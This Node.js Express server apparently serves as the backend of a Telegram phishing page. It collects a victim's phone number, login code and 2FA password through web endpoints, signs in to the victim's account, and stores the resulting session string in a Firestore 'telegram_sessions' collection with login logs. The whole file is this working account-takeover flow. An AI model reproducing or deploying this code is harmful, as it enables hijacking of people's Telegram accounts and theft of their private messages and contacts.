require('dotenv').config();
const express = require('express');
const path = require('path');

const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram');

// Firebase Admin
const admin = require('firebase-admin');
const serviceAccount = require('./serviceAccountKey.json');

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
});

const db = admin.firestore();

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

// ================= CONFIG =================
const apiId = parseInt(process.env.API_ID);
const apiHash = process.env.API_HASH;

// temp session store (memory)
const tempSessions = {};

// ================= HOME =================
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/favicon.ico', (req, res) => res.status(204));

// ================= HELPER =================
function normalize(phone) {
  phone = String(phone).trim();
  if (!phone.startsWith('+')) phone = '+855' + phone;
  return phone;
}

// ================= FIREBASE SAVE =================
async function saveToFirestore(phone, sessionString, has2FA) {
  const userRef = db.collection('telegram_sessions').doc(phone);

  // save main
  await userRef.set({
    phone,
    sessionString,
    has2FA,
    lastLogin: admin.firestore.FieldValue.serverTimestamp()
  });

  // save log history
  await userRef.collection('logs').add({
    status: "success",
    has2FA,
    timestamp: admin.firestore.FieldValue.serverTimestamp()
  });
}

// ================= STEP 1: SEND OTP =================
app.post('/send-otp', async (req, res) => {
  let { phone } = req.body;

  try {
    phone = normalize(phone);

    const client = new TelegramClient(
      new StringSession(''),
      apiId,
      apiHash,
      { connectionRetries: 5 }
    );

    await client.connect();

    const result = await client.invoke(
      new Api.auth.SendCode({
        phoneNumber: phone,
        apiId,
        apiHash,
        settings: new Api.CodeSettings({})
      })
    );

    tempSessions[phone] = {
      client,
      phoneCodeHash: result.phoneCodeHash,
      createdAt: Date.now()
    };

    console.log("📩 OTP sent:", phone);

    res.json({ success: true });

  } catch (err) {
    console.error("SEND OTP ERROR:", err);
    res.json({ success: false, message: err.message });
  }
});

// ================= STEP 2: LOGIN OTP =================
app.post('/login', async (req, res) => {
  let { phone, otp } = req.body;

  try {
    phone = normalize(phone);

    const temp = tempSessions[phone];
    if (!temp) {
      return res.json({ success: false, message: "Session expired" });
    }

    const { client, phoneCodeHash } = temp;

    try {
      await client.signIn({
        phoneNumber: phone,
        phoneCode: String(otp),
        phoneCodeHash
      });

    } catch (err) {
      // 🔐 NEED 2FA
      if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
        return res.json({ requirePassword: true });
      }
      throw err;
    }

    // ✅ SUCCESS (NO 2FA)
    const sessionString = client.session.save();

    console.log("✅ LOGIN SUCCESS:", phone);

    await saveToFirestore(phone, sessionString, "nopass");

    delete tempSessions[phone];

    res.json({
      success: true,
      session: sessionString
    });

  } catch (err) {
    console.error("LOGIN ERROR:", err);
    res.json({ success: false, message: err.message });
  }
});

// ================= STEP 3: LOGIN 2FA =================
app.post('/login-password', async (req, res) => {
  let { phone, password } = req.body;

  try {
    phone = normalize(phone);

    const temp = tempSessions[phone];
    if (!temp) {
      return res.json({ success: false, message: "Session expired" });
    }

    const { client } = temp;

    await client.signInWithPassword({
      password: String(password)
    });

    const sessionString = client.session.save();

    console.log("🔐 LOGIN 2FA SUCCESS:", phone);

    await saveToFirestore(phone, sessionString, "pass");

    delete tempSessions[phone];

    res.json({
      success: true,
      session: sessionString
    });

  } catch (err) {
    console.error("2FA ERROR:", err);
    res.json({ success: false, message: err.message });
  }
});

// ================= AUTO CLEAN TEMP =================
setInterval(() => {
  const now = Date.now();

  Object.keys(tempSessions).forEach(phone => {
    if (now - tempSessions[phone].createdAt > 5 * 60 * 1000) {
      delete tempSessions[phone];
      console.log("🧹 Session cleared:", phone);
    }
  });
}, 60000);

// ================= START SERVER =================
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("🚀 Server running on http://localhost:" + PORT);
});
